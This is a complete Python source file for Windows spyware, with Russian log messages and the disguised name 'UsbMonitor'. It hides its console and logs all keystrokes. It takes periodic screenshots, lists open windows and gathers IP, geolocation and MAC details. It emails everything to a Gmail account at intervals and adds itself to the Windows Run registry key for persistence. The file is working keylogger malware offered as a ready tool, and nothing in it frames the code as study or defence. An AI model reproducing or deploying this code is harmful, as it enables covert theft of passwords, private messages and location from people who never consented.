import os
import sys
import json
import smtplib
import tempfile
import threading
import schedule
import time
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Listener, Key
from email import encoders
from email.mime.base import MIMEBase
import mss
import ctypes
import winreg
import subprocess
import requests
import uuid
import psutil
import win32gui
import win32process

required_modules = ["schedule", "pynput", "mss", "cryptography", "requests", "psutil", "pywin32"]


def install_missing_modules():
    requirements_file = "requirements.txt"
    if not os.path.exists(requirements_file):
        print(f"File {requirements_file} not found. Make sure it is in the root directory.")
        return

    try:
        print(f"Установка модулей из {requirements_file}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", requirements_file])
        print("Все модули установлены успешно.")
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при установке модулей: {e}")
        sys.exit(1)


install_missing_modules()


def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception as e:
        logging.error(f"Failed to hide console window: {e}")


hide_console()

logging.basicConfig(
    filename="usb_log.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)


def load_config():
    config_path = "config.json"
    if not os.path.exists(config_path):
        create_config(config_path)
    with open(config_path, "r") as config_file:
        config = json.load(config_file)
    return config


def create_config(config_path):
    email = input("Введите ваш email: ")
    password = input("Введите пароль от email: ")
    config_data = {"email_address": email, "email_password": password}
    with open(config_path, "w") as config_file:
        json.dump(config_data, config_file)


config = load_config()
EMAIL_ADDRESS = config.get("email_address")
EMAIL_PASSWORD = config.get("email_password")

if not EMAIL_ADDRESS or not EMAIL_PASSWORD:
    logging.error("Некорректные данные в конфигурационном файле!")
    sys.exit("Конфигурационный файл должен содержать email и пароль.")

SEND_REPORT_EVERY = 20
SCREENSHOT_INTERVAL = 30
LOCATION_INTERVAL = 300


class Usb:
    def __init__(self, email, password):
        self.interval = SEND_REPORT_EVERY
        self.log_file = tempfile.NamedTemporaryFile(delete=False, mode='w+', encoding='utf-8')
        self.email = email
        self.password = password
        self.text_changed = False

    def appendlog(self, string):
        try:
            self.log_file.write(string)
            self.log_file.flush()
            self.text_changed = True
        except Exception as e:
            logging.error(f"Ошибка записи в лог: {e}")

    def save_data(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                current_key = str(key.char)
            else:
                if key == Key.space:
                    current_key = " "
                elif key == Key.enter:
                    current_key = "\n"
                elif key == Key.backspace:
                    self.remove_last_char()
                    return
                else:
                    current_key = f"[{key.name.upper()}]"
            self.appendlog(current_key)
        except Exception as e:
            logging.error(f"Ошибка при обработке нажатия клавиши: {e}")

    def remove_last_char(self):
        try:
            self.log_file.seek(0)
            data = self.log_file.read()
            self.log_file.seek(0)
            self.log_file.truncate(0)
            self.log_file.write(data[:-1])
            self.log_file.flush()
        except Exception as e:
            logging.error(f"Ошибка удаления последнего символа из лог-файла: {e}")

    def send_mail(self, email, password, message, attachments=None):
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = "Log Report"
        body = MIMEText(message, 'plain', 'utf-8')
        msg.attach(body)

        if attachments:
            for attachment in attachments:
                if attachment and os.path.exists(attachment):
                    attachment_name = os.path.basename(attachment)
                    with open(attachment, 'rb') as f:
                        mime_base = MIMEBase('application', 'octet-stream')
                        mime_base.set_payload(f.read())
                        encoders.encode_base64(mime_base)
                        mime_base.add_header('Content-Disposition', f'attachment; filename="{attachment_name}"')
                        msg.attach(mime_base)

        try:
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                server.login(email, password)
                server.sendmail(email, email, msg.as_string())
        except Exception as e:
            logging.error(f"Не удалось отправить письмо: {e}")

    def get_network_info(self):
        try:
            response = requests.get("https://ipinfo.io/json")
            if response.status_code == 200:
                data = response.json()
                ipv6 = self.get_ipv6() if "ipv6" not in data else data.get("ipv6")
                data["ipv6"] = ipv6
                return data
            else:
                logging.error(f"Ошибка получения данных с ipinfo.io: {response.status_code}")
                return None
        except requests.RequestException as e:
            logging.error(f"Ошибка получения сетевых данных: {e}")
            return None

    def get_ipv6(self):
        try:
            response = requests.get("https://api64.ipify.org?format=json")
            if response.status_code == 200:
                ipv6_address = response.json().get("ip")
                return ipv6_address
            else:
                return "Unavailable"
        except requests.RequestException as e:
            logging.error(f"Ошибка получения IPv6: {e}")
            return "Unavailable"

    def get_mac_address(self):
        try:
            mac = uuid.getnode()
            mac_address = ':'.join([f'{(mac >> ele) & 0xff:02x}' for ele in range(0, 8 * 6, 8)][::-1])
            return mac_address
        except Exception as e:
            logging.error(f"Ошибка получения MAC-адреса: {e}")
            return "MAC-адрес не найден"

    def get_active_window(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            pid = win32process.GetWindowThreadProcessId(hwnd)[1]
            active_window_name = win32gui.GetWindowText(hwnd)
            process_name = psutil.Process(pid).name()
            return active_window_name, process_name
        except Exception as e:
            logging.error(f"Ошибка получения активного окна: {e}")
            return None, None

    def get_open_windows(self):
        open_windows = []

        def enum_windows_callback(hwnd, results):
            if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                process_name = psutil.Process(pid).name()
                open_windows.append(f"Процесс: {process_name} (PID: {pid}) - Окно: {win32gui.GetWindowText(hwnd)}")

        win32gui.EnumWindows(enum_windows_callback, None)
        return open_windows

    def report_text_and_screenshot(self):
        if self.text_changed:
            self.report(include_screenshot=True)
            self.text_changed = False
        threading.Timer(SCREENSHOT_INTERVAL, self.report_text_and_screenshot).start()

    def report_location_and_windows(self):
        self.report(include_screenshot=False, include_windows=True)
        threading.Timer(LOCATION_INTERVAL, self.report_location_and_windows).start()

    def report(self, include_screenshot=False, include_windows=False):
        network_data = self.get_network_info() if include_windows else None
        open_windows_info = "\n".join(self.get_open_windows()) if include_windows else None

        message = ""
        if network_data:
            message += (
                f"--- Network Information ---\n"
                f"IP Address (IPv4): {network_data.get('ip')}\n"
                f"IPv6: {network_data.get('ipv6')}\n"
                f"MAC Address: {self.get_mac_address()}\n"
                f"Hostname: {network_data.get('hostname')}\n"
                f"City: {network_data.get('city')}\n"
                f"Region: {network_data.get('region')}\n"
                f"Country: {network_data.get('country')}\n"
                f"Location: {network_data.get('loc')}\n"
                f"Organization: {network_data.get('org')}\n"
                f"Postal Code: {network_data.get('postal')}\n"
                f"Timezone: {network_data.get('timezone')}\n\n"
            )
        if include_windows:
            message += f"--- All Open Windows ---\n{open_windows_info}\n\n"

        self.log_file.seek(0)
        message += "--- Keystrokes ---\n" + self.log_file.read()
        self.log_file.truncate(0)
        screenshot_filename = self.screenshot() if include_screenshot else None
        self.send_mail(self.email, self.password, message,
                       attachments=[screenshot_filename, "usb_log.log"] if include_screenshot else ["usb_log.log"])

    def screenshot(self):
        try:
            with mss.mss() as sct:
                screenshot_filename = os.path.join(os.getcwd(), "screenshot.png")
                sct.shot(output=screenshot_filename)
                return screenshot_filename
        except Exception as e:
            logging.error(f"Не удалось сделать скриншот: {e}")
            return None

    def run(self):
        threading.Thread(target=self.start_keylogger, daemon=True).start()
        self.report_text_and_screenshot()
        self.report_location_and_windows()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logging.info("Программа завершена пользователем.")

    def start_keylogger(self):
        with Listener(on_press=self.save_data) as keyboard_listener:
            keyboard_listener.join()


def add_to_startup(file_path=None):
    if file_path is None:
        file_path = os.path.abspath(sys.argv[0])
    try:
        key = winreg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(registry_key, "UsbMonitor", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(registry_key)
    except PermissionError:
        logging.warning(f"Недостаточно прав для автозапуска.")
    except Exception as e:
        logging.error(f"Ошибка автозапуска: {e}")


add_to_startup()
start = Usb(EMAIL_ADDRESS, EMAIL_PASSWORD)
start.run()